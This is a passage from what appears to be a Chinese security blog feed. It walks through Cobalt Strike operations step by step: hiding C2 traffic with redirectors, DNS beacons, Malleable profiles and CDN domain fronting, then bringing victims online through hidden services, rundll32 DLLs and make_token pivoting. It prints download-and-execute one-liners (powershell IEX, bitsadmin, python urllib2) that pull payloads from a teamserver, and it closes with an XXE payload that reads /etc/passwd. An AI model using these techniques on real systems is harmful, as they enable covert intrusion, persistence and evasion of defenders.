<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore cobaltstrike<span class="selector-class">.store</span> -destkeystore cobaltstrike<span class="selector-class">.store</span> -deststoretype pkcs12</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821171732016.png" alt="image-20200821171732016"></p>
<p>修改端口 编辑teamserver文件，将端口从50050修改为50005</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821172405018.png" alt="image-20200821172405018"></p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>创建重定向监听器cdx，HTTP Hosts填入中转的vps地址，HTTP Host(Stager)地址也填入中转的vps地址，端口为80端口。</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821160118935.png" alt="image-20200821160118935"></p>
<p>在中转vps进行流量转发，将中转vps的80端口流量转发到teamserver的80端口</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">socat</span> <span class="selector-tag">TCP4-LISTEN</span><span class="selector-pseudo">:80</span>,<span class="selector-tag">fork</span> <span class="selector-tag">TCP4</span>:<span class="selector-attr">[team server]</span><span class="selector-pseudo">:80</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821164516792.png" alt="image-20200821164516792"></p>
<p>生成shellcode后执行上线。</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821165306829.png" alt="image-20200821165306829"></p>
<p>查看通信流量为于中转vps的交互</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821165736498.png" alt="image-20200821165736498"></p>
<p>##DNS Beacon</p>
<p>DNS Beacon将数据封装在DNS协议中，然后利用DNS查询过程进行数据传输。可躲避一些防火墙和入侵检测设备，且DNS走UDP协议，受害机一般无特殊异常且较难发现。</p>
<p>设置一个A类地址指向teamserver的ip地址</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200817225615765.png" alt="image-20200817225615765"></p>
<p>在创建几个ns记录指向刚才创建的A类地址，结果如下</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200818103031338.png" alt="image-20200818103031338"></p>
<p>创建一个Listener，payload选择Beacon DNS，DNS Hosts填写刚才创建的两个ns地址，DNS Host地址填写任意一个ns地址</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200818125241550.png" alt="image-20200818125241550"></p>
<p>创建完后本机执行<code>nslookup ns地址</code>，返回为0.0.0.0则表示成功。</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200818125353029.png" alt="image-20200818125353029"></p>
<p>然后创建一个Stageless，选择刚才创建的Listener</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200818125951466.png" alt="image-20200818125951466"></p>
<p>执行后会有机子上线，但显示为黑色。</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200818130057154.png" alt="image-20200818130057154"></p>
<p>此时在Beacon中输入以下命令</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">checkin</span>  <span class="comment">#强制回连</span></span><br><span class="line">mode dns-txt   <span class="comment">#使用dns TXT记录的数据通道</span></span><br></pre></td></tr></table></figure>

<p>输入以上命令后再输入任意命令执行后点亮受害机</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200818130617138.png" alt="image-20200818130617138"></p>
<p>wireshark抓包可以发现数据走dns-txt，但会显示ns域名信息（打码处）</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200818153051395.png" alt="image-20200818153051395"></p>
<p>除了mode dns-txt 外还可以使用mode dns 使用dns A记录的数据通道（ipv4）和mode dns6 使用dns AAAA记录的数据通道（ipv6）。</p>
<h2 id="流量伪装"><a href="#流量伪装" class="headerlink" title="流量伪装"></a>流量伪装</h2><p>流量伪造主要使用Malleable-C2-Profiles脚本，github搜索即可。</p>
<p>先来看发现4.1的流量，wireshark使用<code>ip.addr == vpsip and tcp.port == 81 and http</code>命令抓包发现流量内通已经加密</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200817162149285.png" alt="image-20200817162149285"></p>
<p>但依然可以post请求中可以发现cs的特征。</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200817181513752.png" alt="image-20200817181513752"></p>
<p>使用Malleable-C2-Profiles来隐藏流量</p>
<p>使用方法：<code>./teamserver [external IP] [password] [/path/to/my.profile]</code></p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200817191014733.png" alt="image-20200817191014733"></p>
<p>配置后需要重新生成shellcode，执行后发现post数据包为amazon内容。</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200817193936853.png" alt="image-20200817193936853"></p>
<p>部分代码如下</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200817194151708.png" alt="image-20200817194151708"></p>
<h2 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h2><p>使用阿里云cdn做测试，伪造高可信域名，如下配置</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200819222241488.png" alt="image-20200819222241488"></p>
<p>配置完后复制cnname地址，使用多地区ping，获取域名的ip地址</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200819222934691.png" alt="image-20200819222934691"></p>
<p>配置好后测试一下CDN转发功能，在C2监听80端口，个人终端执行请求：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">curl</span> 阿里云CDN节点<span class="built_in">IP</span>/  -H <span class="string">"Host:你配置的CDN域名"</span> -v</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200820234324385.png" alt="image-20200820234324385"></p>
<p>如果返回码为404则表示成功。</p>
<p>使用Malleable-C2-Profiles，统一替换里面的设置里面的header “Host”值为自己配置的域名，同时配置dc_ref的地址也为自己的域名</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200820234755204.png" alt="image-20200820234755204"></p>
<p>重新启动cs，建立监听器HTTP Hosts中填写一些阿里云cdn的ip，HTTP Host（stager）填写配置的ip，端口为80。</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821101600836.png" alt="image-20200821101600836"></p>
<p>配置完后观察Web_log会有不断的请求。</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821093712489.png" alt="image-20200821093712489"></p>
<p>生成exe测试上线</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821140946009.png" alt="image-20200821140946009"></p>
<p>可以上线，其中external的地址会不断变化</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821141003994.png" alt="image-20200821141003994"></p>
<p>wireshark抓包发现请求地址为配置的域名</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821110130415.png" alt="image-20200821110130415"></p>
<p>其中流量已伪装，传输数据已加密，通信地址都为cdn的ip</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821112504776.png" alt="image-20200821112504776"></p>
<p>流量中搜索不到真实teamserver地址</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821111649965.png" alt="image-20200821111649965"></p>
<p>如果是cs3.14，则需要用到CACTUSTORCH脚本。地址：</p>
<p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH.git" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/CACTUSTORCH.git</a></p>
<p>加载成功后选择如下</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821091310416.png" alt="image-20200821091310416"></p>
<p>生成一个HTA payload</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821092818844.png" alt="image-20200821092818844"></p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821101134524.png" alt="image-20200821101134524"></p>
<p>受害机执行如下命令</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821095440458.png" alt="image-20200821095440458"></p>
<p>成功上线</p>
<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821101509781.png" alt="image-20200821101509781"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike之tcp/smb_bind上线</title>
    <url>/2020/08/12/Cobaltstrike%E4%B9%8Btcp-smb-bind%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<p>本文测试使用Cobaltstrike之tcp/smb_bind上线，默认172.16.237.157已经上线，目标是要让172.16.237.163的主机上线。总体拓扑图如下：</p><p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200825194116409.png" alt="image-20200825194116409"></p><h2 id="tcp-bind"><a href="#tcp-bind" class="headerlink" title="tcp_bind"></a>tcp_bind</h2><p>新建一个监听器，Payload选择Beacon TCP</p><p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816110649743.png" alt="image-20200816110649743"></p><p>注：3.14任意修改端口还是连接4444，4.1版本修改其他端口还是连接4444，但如果修改了就有可能连接不上</p><a id="more"></a>




<p>Attack-Packages-Windows Executable(S)生成shellcode</p>
<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816104606525.png" alt="image-20200816104606525"></p>
<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816104650797.png" alt="image-20200816104650797"></p>
<p>在172.16.237.157的beacon中输入命令<code>connect 172.16.237.163</code>进行连接后成功上线，可以看出是通过172.16.237.157的主机上线</p>
<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816110411529.png" alt="image-20200816110411529"></p>
<p>查询172.16.237.163主机连接信息如下</p>
<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816111140755.png" alt="image-20200816111140755"></p>
<p>注：172.16.237.163主机不能开防火墙</p>
<p>端开命令为<code>unlink IP</code>地址，需要时可再次使用link连接</p>
<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816111341035.png" alt="image-20200816111341035"></p>
<h2 id="smb-bind"><a href="#smb-bind" class="headerlink" title="smb_bind"></a>smb_bind</h2><p>前提条件：未开防火墙或者允许445端口入栈</p>
<p>建立监听器如下，选择Payload选择Beacon SMB</p>
<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816111909314.png" alt="image-20200816111909314"></p>
<p>生成Windows Service EXE</p>
<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816112102276.png" alt="image-20200816112102276"></p>
<p>生成后在172.16.237.163主机执行后在172.16.237.157主机使用<code>link</code>命令无法直接连接，此时需要知道172.16.237.163主机的账号密码或者令牌</p>
<p>172.16.237.163主机执行以下命令</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rev2self</span>  <span class="comment">#初始化，清空之前的令牌信息</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816113357363.png" alt="image-20200816113357363"></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">make_token Administrator <span class="number">123.</span>com  #伪造令牌信息 Administrator <span class="number">123.</span>com为<span class="number">163</span>主机的账号密码</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816113458267.png" alt="image-20200816113458267"></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">link</span> 172<span class="selector-class">.16</span><span class="selector-class">.237</span><span class="selector-class">.163</span>连接</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816113528375.png" alt="image-20200816113528375"></p>
<p>成功上线</p>
<p><img src="//choge.top/2020/08/12/Cobaltstrike之tcp-smb-bind上线/image-20200816113556775.png" alt="image-20200816113556775"></p>
<p>使用unlink可以断开连接，需要时可再次使用link连接</p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike上线之stagerless</title>
    <url>/2020/08/11/Cobaltstrike%E4%B8%8A%E7%BA%BF%E4%B9%8Bstagerless/</url>
    <content><![CDATA[<h2 id="Cobaltstrike上线之stagerless"><a href="#Cobaltstrike上线之stagerless" class="headerlink" title="Cobaltstrike上线之stagerless"></a>Cobaltstrike上线之stagerless</h2><p>建立监听器后选择Attacks-Packages-Windows Executable(S)</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stagerless/image-20200811104701088.png" alt="image-20200811104701088"></p>
<p>生成powershell脚本</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stagerless/image-20200811104746495.png" alt="image-20200811104746495"></p>
<p>执行powershell命令</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">powershell</span> -<span class="keyword">nop </span>-exec <span class="keyword">bypass </span>-f <span class="keyword">beacon.psl</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stagerless/image-20200812000144150.png" alt="image-20200812000144150"></p>
<p>成功上线</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stagerless/image-20200812000402915.png" alt="image-20200812000402915"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike上线之stager</title>
    <url>/2020/08/11/Cobaltstrike%E4%B8%8A%E7%BA%BF%E4%B9%8Bstager/</url>
    <content><![CDATA[<p>Cobalt Strike上线之stage</p><h2 id="Windows-EXE上线"><a href="#Windows-EXE上线" class="headerlink" title="Windows EXE上线"></a>Windows EXE上线</h2><p>参考之前文章</p><h2 id="Windows-Service-EXE上线"><a href="#Windows-Service-EXE上线" class="headerlink" title="Windows Service EXE上线"></a>Windows Service EXE上线</h2><p>生成shellcode如下</p><p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811084613680.png" alt="image-20200811084613680"></p><p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811085012004.png" alt="image-20200811085012004"></p><p>需要绕过UAC权限执行以下命令</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sc <span class="keyword">create</span> <span class="string">"evil"</span> binpath= <span class="string">"c:\users\administrator\desktop\artifact.exe"</span>  <span class="comment">#创建服务 #evil为服务名，可以取得有隐秘性的名称如Micsoft office #binpath=后跟上路径</span></span><br><span class="line">sc <span class="keyword">start</span> <span class="string">"evil"</span>  <span class="comment">#启动服务</span></span><br><span class="line">sc <span class="keyword">delete</span> <span class="string">"evil"</span>  <span class="comment">#删除服务</span></span><br><span class="line"><span class="keyword">attrib</span> +h artifact.exe  <span class="comment">#隐藏文件</span></span><br><span class="line"><span class="keyword">attrib</span> -h artifact.exe  <span class="comment">#取消隐藏文件</span></span><br></pre></td></tr></table></figure><a id="more"></a>







<p>注意路径为已登录用户路径</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811231022695.png" alt="image-20200811231022695"></p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811230728630.png" alt="image-20200811230728630"></p>
<p>查看已启动的服务</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811231105542.png" alt="image-20200811231105542"></p>
<p>成功上线</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811231201848.png" alt="image-20200811231201848"></p>
<h2 id="Windows-DLL上线"><a href="#Windows-DLL上线" class="headerlink" title="Windows DLL上线"></a>Windows DLL上线</h2><p>生成shellcode时选择Windows DLL</p>
<p>受害机执行以下命令</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> micsoft<span class="selector-class">.dll</span> Start</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811232516838.png" alt="image-20200811232516838"></p>
<p>经测试在Win2008下以后管理员启动成功</p>
<p>wmic可查看是否注入成功</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">wmic process <span class="keyword">where</span> caption=<span class="string">"rundll32.exe"</span> <span class="keyword">get</span> caption,commandline /<span class="keyword">value</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811232626628.png" alt="image-20200811232626628"></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">wmic process <span class="keyword">where</span> caption=<span class="string">"rundll32.exe"</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811233045842.png" alt="image-20200811233045842"></p>
<p>tasklist也可查看是否注入</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">tasklist <span class="string">/m</span> micsoft.dll</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811233127317.png" alt="image-20200811233127317"></p>
<p>注入到系统进程后不能结束，强制结束进程可能会导致系统崩溃、</p>
<h2 id="Powershell上线"><a href="#Powershell上线" class="headerlink" title="Powershell上线"></a>Powershell上线</h2><p>如下路径生成Powershell进行投递</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811093409623.png" alt="image-20200811093409623"></p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811095642120.png" alt="image-20200811095642120"></p>
<p>代码如下</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w <span class="keyword">hidden</span> -<span class="keyword">c</span> <span class="string">"IEX ((new-object net.webclient).downloadstring('http://teamserverip:8088/home/default/pow'))"</span></span><br></pre></td></tr></table></figure>

<p>也可以在此处查看执行代码</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811095444816.png" alt="image-20200811095444816"></p>
<p>受害机执行代码后成功上线</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811233722150.png" alt="image-20200811233722150"></p>
<p>##bitsadmin上线</p>
<p>如图Type选择bitsadmin</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811233928654.png" alt="image-20200811233928654"></p>
<p>生成代码</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811233952973.png" alt="image-20200811233952973"></p>
<p>代码如下</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">cmd.exe /c bitsadmin /transfer 7faa http://teamserverip:8080/home/xxx <span class="variable">%APPDATA%</span><span class="symbol">\7</span>faa.exe&amp;<span class="variable">%APPDATA%</span><span class="symbol">\7</span>faa.exe&amp;del <span class="variable">%APPDATA%</span><span class="symbol">\7</span>faa.exe</span><br></pre></td></tr></table></figure>

<p>执行后弹框</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811234113173.png" alt="image-20200811234113173"></p>
<p>在cmd下去掉cmd.exe /c直接执行命令就不会新弹一个窗口</p>
<p>成功上线</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811234220145.png" alt="image-20200811234220145"></p>
<h2 id="Python上线"><a href="#Python上线" class="headerlink" title="Python上线"></a>Python上线</h2><p>如图，Type选择python</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811234422650.png" alt="image-20200811234422650"></p>
<p>成功生成代码</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200811234445993.png" alt="image-20200811234445993"></p>
<p>代码如下</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">"import urllib2; exec urllib2.urlopen('http://teamserverip:8088/home/sss').read();"</span></span><br></pre></td></tr></table></figure>

<p>经测试未成功</p>
<p>最后在Windows 2008 X64，python2.7环境下上线测试成功，方法同上。</p>
<p><img src="//choge.top/2020/08/11/Cobaltstrike上线之stager/image-20200831124846625.png" alt="image-20200831124846625"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞</title>
    <url>/2020/07/27/XXE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h3><p>XML External Entity Iniection </p><h4 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h4><p>xml是一种可扩展标记语言</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为"#PCDATA"类型--&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from（#PCDATA)&gt;&lt;!--定义from元素为"#PCDATA"类型--&gt; </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>



<h4 id="XML文档与DTD文档"><a href="#XML文档与DTD文档" class="headerlink" title="XML文档与DTD文档"></a>XML文档与DTD文档</h4><p>DTD (Documnet Type Definition）即文档类型定义，是一种XML 约束模式语言，属于 XML 文件组成的一部分</p>
<p>DTD 文档有三种应用形式 </p>
<ol>
<li>内部 DTD 文档</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素[定义内容]&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为"#PCDATA"类型--&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from（#PCDATA)&gt;&lt;!--定义from元素为"#PCDATA"类型--&gt; </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>外部 DTD 文档</li>
</ol>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素<span class="built_in"> SYSTEM </span><span class="string">"DTD文件路径"</span>&gt;    #函数SYSTEM的加载<span class="string">"DTD文件路径"</span>的内容赋值给根元素</span><br></pre></td></tr></table></figure>

<p>新建一个DTD文档outdtd.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding"utf-8"?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">poem</span>  (<span class="attr">author</span>,<span class="attr">title</span>,<span class="attr">content</span>)&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">author</span>  (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">title</span>  (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>

<p>新建一个xml文档outdtd.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE poem SYSTEM "dtd_2.dtd" [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT poem  (author,title,content)&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT content  (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">author</span>&gt;</span>wangwei<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">content</span>&gt;</span> this is content<span class="tag">&lt;/<span class="name">content</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">poem</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>内外部 DTD 文档结合</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "DTD文件路径"[定义内容]&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="dtd文档和xml文档实例的关系"><a href="#dtd文档和xml文档实例的关系" class="headerlink" title="dtd文档和xml文档实例的关系"></a>dtd文档和xml文档实例的关系</h4><p>数据库表结构与数据记录：</p>
<p>由于 DTD，每个 XML 文件可以携带一个自身格式的描述</p>
<p>由于 DTD，不同组织的人可以使用一个通用DTD来交换数据</p>
<p>应用程序可以使用一个标准DTD校验从外部世界接收来的XML数据是否有效。</p>
<h4 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h4><p>XML分为普通实体和参数实体</p>
<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200728192442843.png" alt="image-20200728192442843"></p>
<h5 id="普通实体引入外部实体"><a href="#普通实体引入外部实体" class="headerlink" title="普通实体引入外部实体"></a>普通实体引入外部实体</h5><p>新建xml文件，引入外部实体参数</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE poem [</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span></span><br><span class="line">&amp;xxe;</span><br><span class="line"><span class="tag">&lt;/<span class="name">poem</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="参数实体引入外部实体"><a href="#参数实体引入外部实体" class="headerlink" title="参数实体引入外部实体"></a>参数实体引入外部实体</h5><p>新建xml文件，引入外部参数实体</p>
